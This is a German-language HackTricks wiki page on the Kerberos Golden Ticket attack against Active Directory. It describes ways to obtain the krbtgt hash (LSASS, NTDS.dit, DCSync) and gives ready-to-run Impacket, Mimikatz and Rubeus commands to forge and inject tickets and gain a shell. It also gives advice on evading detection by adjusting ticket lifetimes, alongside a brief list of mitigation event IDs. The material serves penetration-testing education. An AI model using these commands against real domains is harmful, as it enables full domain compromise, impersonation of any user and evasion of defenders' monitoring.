# Golden Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Golden Ticket

Ein **Golden Ticket**-Angriff besteht in der **Erstellung eines legitimen Ticket Granting Ticket (TGT), das einen beliebigen Benutzer impersoniert**, durch die Verwendung des **NTLM-Hashes des Active Directory (AD) krbtgt-Kontos**. Diese Technik ist besonders vorteilhaft, da sie **Zugriff auf jeden Dienst oder jede Maschine** innerhalb der Domäne als der impersonierte Benutzer ermöglicht. Es ist wichtig zu beachten, dass die **Anmeldeinformationen des krbtgt-Kontos niemals automatisch aktualisiert werden**.

Um den **NTLM-Hash** des krbtgt-Kontos zu **erwerben**, können verschiedene Methoden eingesetzt werden. Er kann aus dem **Local Security Authority Subsystem Service (LSASS)-Prozess** oder der **NT Directory Services (NTDS.dit)-Datei** extrahiert werden, die sich auf jedem Domain Controller (DC) innerhalb der Domäne befindet. Darüber hinaus ist das **Durchführen eines DCsync-Angriffs** eine weitere Strategie, um diesen NTLM-Hash zu erhalten, die mit Tools wie dem **lsadump::dcsync-Modul** in Mimikatz oder dem **secretsdump.py-Skript** von Impacket durchgeführt werden kann. Es ist wichtig zu betonen, dass für die Durchführung dieser Operationen in der Regel **Domain-Admin-Rechte oder ein ähnliches Zugriffslevel erforderlich sind**.

Obwohl der NTLM-Hash als praktikable Methode für diesen Zweck dient, wird **dringend empfohlen**, **Tickets mit den Advanced Encryption Standard (AES) Kerberos-Schlüsseln (AES128 und AES256)** aus Sicherheitsgründen zu fälschen.


{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Von Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Sobald** Sie das **goldene Ticket injiziert** haben, können Sie auf die freigegebenen Dateien **(C$)** zugreifen und Dienste sowie WMI ausführen, sodass Sie **psexec** oder **wmiexec** verwenden können, um eine Shell zu erhalten (es scheint, dass Sie keine Shell über winrm erhalten können).

### Umgehung gängiger Erkennungen

Die häufigsten Möglichkeiten, ein goldenes Ticket zu erkennen, bestehen darin, den **Kerberos-Verkehr** im Netzwerk zu inspizieren. Standardmäßig **signiert Mimikatz das TGT für 10 Jahre**, was sich in nachfolgenden TGS-Anfragen, die damit gestellt werden, als anomales Verhalten abheben wird.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Verwenden Sie die Parameter `/startoffset`, `/endin` und `/renewmax`, um den Startoffset, die Dauer und die maximalen Erneuerungen (alle in Minuten) zu steuern.
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Leider wird die Lebensdauer des TGTs nicht in 4769 protokolliert, sodass Sie diese Informationen nicht in den Windows-Ereignisprotokollen finden werden. Was Sie jedoch korrelieren können, ist **das Sehen von 4769 ohne ein vorhergehendes 4768**. Es ist **nicht möglich, ein TGS ohne ein TGT anzufordern**, und wenn es keinen Nachweis über die Ausstellung eines TGTs gibt, können wir schließen, dass es offline gefälscht wurde.

Um diese **Erkennung zu umgehen**, überprüfen Sie die Diamond-Tickets:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Minderung

* 4624: Kontoanmeldung
* 4672: Admin-Anmeldung
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Andere kleine Tricks, die Verteidiger anwenden können, sind **Alarme für 4769 bei sensiblen Benutzern** wie dem Standard-Domain-Administrator-Konto.

## Referenzen
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterstützen</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
